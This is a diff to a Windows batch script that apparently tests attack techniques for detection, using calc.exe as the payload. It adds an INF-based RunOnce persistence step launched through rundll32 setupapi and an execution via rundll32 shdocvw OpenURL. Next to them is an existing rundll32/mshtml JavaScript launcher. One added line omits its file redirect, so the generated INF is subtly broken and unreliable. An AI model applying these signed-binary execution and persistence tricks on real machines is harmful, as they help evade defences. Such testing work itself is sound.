@@ -169,6 +169,31 @@ start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write
 echo "[+] T1085 - Testing rundll32 exec"
 start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
 
+echo "[+] TXXXX - Testing Setupapi driever installation & exec"
+echo ^; DRIVER.INF > calc.inf
+echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
+echo [Version] >> calc.inf
+echo Signature = "$CHICAGO$" >> calc.inf
+echo Class=61883 >> calc.inf
+echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
+echo Provider=%Msft% >> calc.inf
+echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
+echo [DestinationDirs] >> calc.inf
+echo DefaultDestDir = 1 >> calc.inf
+echo [DefaultInstall] >> calc.inf
+echo AddReg = CalcStart >> calc.inf
+echo [CalcStart]
+echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf
+
+rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
+
+echo "[+] TXXXX - Testing Shdocvw exec via rundll32"
+
+echo [InternetShortcut] > C:\windows\temp\url.url
+echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
+rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
+
+
 echo [+] Cleanup
 
 del xxxFile.csproj
@@ -179,4 +204,7 @@ del adrestore.exe
 del Default_File_Path.ps1
 del trace.etl
 del adrestore2.exe
-
+del trace.etl
+del trace.cab
+del calc.inf
+del C:\windows\temp\url.url
